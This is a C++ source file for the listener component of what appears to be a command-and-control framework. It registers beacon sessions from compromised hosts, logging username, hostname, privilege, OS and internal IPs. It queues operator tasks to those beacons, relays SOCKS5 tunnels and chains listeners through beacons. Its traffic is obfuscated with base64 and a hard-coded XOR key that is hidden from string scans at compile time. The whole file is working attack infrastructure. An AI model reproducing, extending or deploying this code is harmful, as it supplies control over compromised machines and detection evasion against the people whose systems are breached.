#include "Listener.hpp"

#ifdef __linux__
#include <unistd.h>
#elif _WIN32
#include <Windows.h>

#define INFO_BUFFER_SIZE 32767
#define  ENV_VAR_STRING_COUNT  (sizeof(envVarStrings)/sizeof(TCHAR*))

#endif

using namespace std;


// XOR encrypted at compile time, so don't appear in string
constexpr std::string_view _KeyTraficEncryption_ = "dfsdgferhzdzxczevre5595485sdg";
constexpr std::string_view mainKeyConfig = ".CRT$XCL";

// compile time encryption
constexpr std::array<char, 29> _EncryptedKeyTraficEncryption_ = compileTimeXOR<29, 8>(_KeyTraficEncryption_, mainKeyConfig);


Listener::Listener(const std::string& param1, const std::string& param2, const std::string& type)
{	
	m_param1 = param1;
	m_param2 = param2;
	m_type = type;
	m_isPrimary = false;

	// m_listenerHash is now composed of a UUID and information related to the machine and the listener
#ifdef __linux__

	char hostname[2048];
	gethostname(hostname, 2048);
	m_hostname = hostname;

#elif _WIN32

	TCHAR  infoBuf[INFO_BUFFER_SIZE];
	DWORD  bufCharCount = INFO_BUFFER_SIZE;

	// Get and display the name of the computer.
	m_hostname = "unknown";
	if( GetComputerName( infoBuf, &bufCharCount ) )
		m_hostname = infoBuf;

#endif
	// TODO take from config ???
	// decrypt key
    std::string keyDecrypted(std::begin(_EncryptedKeyTraficEncryption_), std::end(_EncryptedKeyTraficEncryption_));
    std::string key(mainKeyConfig);
    XOR(keyDecrypted, key);

	m_key=keyDecrypted;
}


const std::string & Listener::getParam1()
{
	return m_param1;
}


const std::string & Listener::getParam2()
{
	return m_param2;
}


const std::string & Listener::getType()
{
	return m_type;
}


const std::string & Listener::getListenerHash()
{
	return m_listenerHash;
}


int Listener::getNumberOfSession()
{
	return m_sessions.size();
}


std::shared_ptr<Session> Listener::getSessionPtr(int idxSession)
{
	std::lock_guard<std::mutex> lock(m_mutex);

	if(idxSession<m_sessions.size())
	{
		std::shared_ptr<Session> ptr = m_sessions[idxSession];
		return ptr;
	}
	else 
		return nullptr;
}


std::shared_ptr<Session> Listener::getSessionPtr(std::string& beaconHash, std::string& listenerHash)
{
	std::lock_guard<std::mutex> lock(m_mutex);


	for(int idxSession=0; idxSession<m_sessions.size(); idxSession++)
	{
		if (beaconHash == m_sessions[idxSession]->getBeaconHash() && listenerHash == m_sessions[idxSession]->getListenerHash())
		{
			std::shared_ptr<Session> ptr = m_sessions[idxSession];
			return ptr;
		}
	}
	return nullptr;
}


bool Listener::isSessionExist(const std::string& beaconHash, const std::string& listenerHash)
{
	std::lock_guard<std::mutex> lock(m_mutex);

	bool sessionExist = false;
	for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
	{
		if (beaconHash == (*it)->getBeaconHash() && listenerHash == (*it)->getListenerHash())
		{
			sessionExist=true;
		}
	}
	return sessionExist;
}


bool Listener::updateSessionPoofOfLife(std::string& beaconHash, std::string& lastProofOfLife)
{
	std::lock_guard<std::mutex> lock(m_mutex);

	bool sessionExist = false;
	for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
	{
		if (beaconHash == (*it)->getBeaconHash())
		{
			sessionExist=true;
			(*it)->updatePoofOfLife(lastProofOfLife);
		}
	}
	return sessionExist;
}


bool Listener::addSessionListener(const std::string& beaconHash, const std::string& listenerHash, const std::string& type, const std::string& param1, const std::string& param2)
{
	std::lock_guard<std::mutex> lock(m_mutex);

	bool sessionExist = false;
	for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
	{
		if (beaconHash == (*it)->getBeaconHash())
		{
			sessionExist=true;
			(*it)->addListener(listenerHash, type, param1, param2);
		}
	}
	return sessionExist;
}


bool Listener::rmSessionListener(const std::string& beaconHash, const std::string& listenerHash)
{
	std::lock_guard<std::mutex> lock(m_mutex);

	bool sessionExist = false;
	for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
	{
		if (beaconHash == (*it)->getBeaconHash())
		{
			sessionExist=true;
			(*it)->rmListener(listenerHash);
		}
	}
	return sessionExist;
}


std::vector<SessionListener> Listener::getSessionListenerInfos()
{
	std::vector<SessionListener> sessionListenerList;
	for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
	{
		if(!(*it)->isSessionKilled())
			sessionListenerList.insert(sessionListenerList.end(), (*it)->getListener().begin(), (*it)->getListener().end());
	}
	return sessionListenerList;
}


bool Listener::markSessionKilled(std::string& beaconHash)
{
	std::lock_guard<std::mutex> lock(m_mutex);

	bool sessionExist = false;
	for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
	{
		if (beaconHash == (*it)->getBeaconHash())
		{
			sessionExist=true;
			(*it)->setSessionKilled();
		}
	}
	return sessionExist;
}


void Listener::queueTask(const std::string& beaconHash, const C2Message& c2Message)
{
	addTask(c2Message, beaconHash);
}


bool Listener::addTask(const C2Message& task, const std::string& beaconHash)
{
	std::lock_guard<std::mutex> lock(m_mutex);

	bool sessionExist = false;
	for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
	{
		if (beaconHash == (*it)->getBeaconHash())
		{
			sessionExist=true;
			(*it)->addTask(task);
		}
	}
	return sessionExist;
}


C2Message Listener::getTask(std::string& beaconHash)
{
	std::lock_guard<std::mutex> lock(m_mutex);

	C2Message output;
	for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
	{
		if (beaconHash == (*it)->getBeaconHash())
		{
			output = (*it)->getTask();
		}
	}

	return output;
}


bool Listener::addTaskResult(const C2Message& taskResult, std::string& beaconHash)
{
	std::lock_guard<std::mutex> lock(m_mutex);

	bool sessionExist = false;
	for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
	{
		if (beaconHash == (*it)->getBeaconHash())
		{
			sessionExist=true;
			(*it)->addTaskResult(taskResult);
		}
	}
	return sessionExist;
}


C2Message Listener::getTaskResult(const std::string& beaconHash)
{
	std::lock_guard<std::mutex> lock(m_mutex);

	C2Message output;
	for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
	{
		if (beaconHash == (*it)->getBeaconHash())
		{
			output = (*it)->getTaskResult();
		}
	}

	return output;
}


//
// SocksSession
// TODO could we do a Templat ?
//

bool Listener::isSocksSessionExist(std::string& beaconHash, std::string& listenerHash)
{
	std::lock_guard<std::mutex> lock(m_mutex);

	bool isSessionExist = false;
	for(auto it = m_socksSessions.begin() ; it != m_socksSessions.end(); ++it )
	{
		if (beaconHash == (*it)->getBeaconHash() && listenerHash == (*it)->getListenerHash())
		{
			isSessionExist=true;
		}
	}
	return isSessionExist;
}


bool Listener::addSocksTaskResult(const C2Message& taskResult, std::string& beaconHash)
{
	std::lock_guard<std::mutex> lock(m_mutex);

	bool sessionExist = false;
	for(auto it = m_socksSessions.begin() ; it != m_socksSessions.end(); ++it )
	{
		if (beaconHash == (*it)->getBeaconHash())
		{
			sessionExist=true;
			(*it)->addTaskResult(taskResult);
		}
	}
	return sessionExist;
}


C2Message Listener::getSocksTaskResult(const std::string& beaconHash)
{
	std::lock_guard<std::mutex> lock(m_mutex);

	C2Message output;
	for(auto it = m_socksSessions.begin() ; it != m_socksSessions.end(); ++it )
	{
		if (beaconHash == (*it)->getBeaconHash())
		{
			output = (*it)->getTaskResult();
		}
	}

	return output;
}


// Main function of the listener
// input is the message send by the beacon to the listener
// output is the message send by listener to the beacon
bool Listener::handleMessages(const std::string& input, std::string& output)
{
	std::string data = base64_decode(input);
	XOR(data, m_key);

	// Mutli Session, Multi message 
	MultiBundleC2Message multiBundleC2Message;
	multiBundleC2Message.ParseFromArray(data.data(), (int)data.size());

	// Handle messages comming from beacons
	// Create taksResult to be display by the TeamServer
	for (int k = 0; k < multiBundleC2Message.bundlec2messages_size(); k++) 
	{
		// For each session (direct session and childs)
		BundleC2Message* bundleC2Message = multiBundleC2Message.bundlec2messages(k);

		// Sessions are unique and created from the pair beaconHash / first listenerHash handling the request
		// If listenerHash is already filled it means that the session was already handled by an other listener befor this one
		std::string beaconHash = bundleC2Message->beaconhash();
		std::string listenerhash = bundleC2Message->listenerhash();
		if(listenerhash.empty())
			listenerhash = getListenerHash();
		bundleC2Message->set_listenerhash(listenerhash);

		// TODO env information shouln't be mandatory and should be check
		// we shoul be able to set information like hostname/username and such upon requesting
		if(beaconHash.size()==SizeBeaconHash)
		{
			bool isExist = isSessionExist(beaconHash, listenerhash);
			if(isExist==false)
			{
				// TODO if no info are provided, queu a getInfo cmd
				SPDLOG_DEBUG("beaconHash {0}, listenerhash {0}", beaconHash, listenerhash);

				std::string username = bundleC2Message->username();
				std::string hostname = bundleC2Message->hostname();
				std::string arch = bundleC2Message->arch();
				std::string privilege = bundleC2Message->privilege();
				std::string os = bundleC2Message->os();
				std::string internalIps = bundleC2Message->internalIps();
				std::string processId = bundleC2Message->processId();
				std::string additionalInformation = bundleC2Message->additionalInformation();

				std::shared_ptr<Session> session = make_shared<Session>(listenerhash, beaconHash, hostname, username, arch, privilege, os);
				session->setInternalIps(internalIps);
				session->setProcessId(processId);
				session->setAdditionalInformation(additionalInformation);
				m_sessions.push_back(std::move(session));
			}
			else
			{
				std::string lastProofOfLife = bundleC2Message->lastProofOfLife();
				updateSessionPoofOfLife(beaconHash, lastProofOfLife);
			}

			// For each message in this session
			for (int j = 0; j < bundleC2Message->c2messages_size(); j++) 
			{
				const C2Message& c2Message = bundleC2Message->c2messages(j);

				// TODO what happen to thos taskResult for listeners that are managed by beacons
				// if(!c2Message.returnvalue().empty() || c2Message.errorCode()>0)
				// {
				addTaskResult(c2Message, beaconHash);
				// }

				// Handle instruction that have impact on this Listener

				// Here if a beacon is terminated, we need to remove the list of sessions associeted with it.
				if(c2Message.instruction()==EndCmd)
				{
					markSessionKilled(beaconHash);
					
					int nbSession = getNumberOfSession();
					for(int kk=0; kk<nbSession; kk++)
					{
						std::shared_ptr<Session> sessions = getSessionPtr(kk);
						std::vector<SessionListener> sessionListenerList;
						sessionListenerList.insert(sessionListenerList.end(), sessions->getListener().begin(), sessions->getListener().end());
						for (int j = 0; j < sessionListenerList.size(); j++)
						{
							rmSessionListener(beaconHash, sessionListenerList[j].getListenerHash());
						}
					}
				}	
				// TODO socks5 handle with socks sessions link to this listener - to test
				// check if the listener is primary (meaning launched by the teamserver, otherwise don't do this) and just relay the task to the next listener
				else if(c2Message.instruction()==Socks5Cmd && m_isPrimary)
				{
					bool isExist = isSocksSessionExist(beaconHash, listenerhash);
					if(isExist==false)
					{
						std::shared_ptr<SocksSession> session = make_shared<SocksSession>(listenerhash, beaconHash);
						m_socksSessions.push_back(std::move(session));
					}

					addSocksTaskResult(c2Message, beaconHash);
				}
				else if(c2Message.instruction()==ListenerCmd)
				{
					std::string cmd = c2Message.cmd();
					std::vector<std::string> splitedCmd;
					std::string delimiter = " ";
					splitList(cmd, delimiter, splitedCmd);

					if(splitedCmd[0]==StartCmd)
					{
						std::string listenerMetadata = c2Message.data();
						std::string listenerHash = c2Message.returnvalue();

						nlohmann::json parsed;
						try
						{
							parsed = nlohmann::json::parse(listenerMetadata);
							std::string type = parsed["1"];
							std::string param1 = parsed["2"];
							std::string param2 = parsed["3"];

							addSessionListener(beaconHash, listenerHash, type, param1, param2);
						} 
						catch (...)
						{
							continue;
						}
					}
					else if(splitedCmd[0]==StopCmd)
					{
						rmSessionListener(beaconHash, c2Message.returnvalue());
					}
				}
				else if(c2Message.instruction()==ListenerPollCmd)
				{					
					std::string listenerMetadata = c2Message.data();
					std::string listenerHash = c2Message.returnvalue();

					nlohmann::json parsed;
					try
					{
						parsed = nlohmann::json::parse(listenerMetadata);
						std::string type = parsed["1"];
						std::string param1 = parsed["2"];
						std::string param2 = parsed["3"];

						addSessionListener(beaconHash, listenerHash, type, param1, param2);
					} 
					catch (...)
					{
						continue;
					}
				}
			}
		}
	}

	// Handle commands to send to Beacons
	// For every beacons contacting the listener, check if their are tasks to be sent and create a message to send it
	bool isTaskToSend=false;
	MultiBundleC2Message multiBundleC2MessageRet;
	for (int k = 0; k < multiBundleC2Message.bundlec2messages_size(); k++) 
	{
		BundleC2Message* bundleC2Message = multiBundleC2Message.bundlec2messages(k);

		// Sessions are unique and created from the pair beaconHash / listenerHash
		// If listenerHash is already filled it means that the session was already handled by other listener befor this one
		std::string beaconHash = bundleC2Message->beaconhash();
		if(beaconHash.size()==SizeBeaconHash)
		{
			// Look for tasks in the queu for the this beacon
			C2Message c2Message = getTask(beaconHash);
			if(!c2Message.instruction().empty())
			{
				isTaskToSend=true;
				BundleC2Message *bundleC2Message = multiBundleC2MessageRet.add_bundlec2messages();
				bundleC2Message->set_beaconhash(beaconHash);

				// Not neaded
				// std::string listenerhash = getListenerHash();
				// bundleC2Message->set_listenerhash(listenerhash);

				while(!c2Message.instruction().empty())
				{
					C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
					addedC2MessageRet->CopyFrom(c2Message);
					c2Message = getTask(beaconHash);	
				}	
			}
		}
	}

	data="";
	if(isTaskToSend)
		multiBundleC2MessageRet.SerializeToString(&data);

	if (data.empty())
		data = "{}";

	XOR(data, m_key);
	output = base64_encode(data);

	return isTaskToSend;
}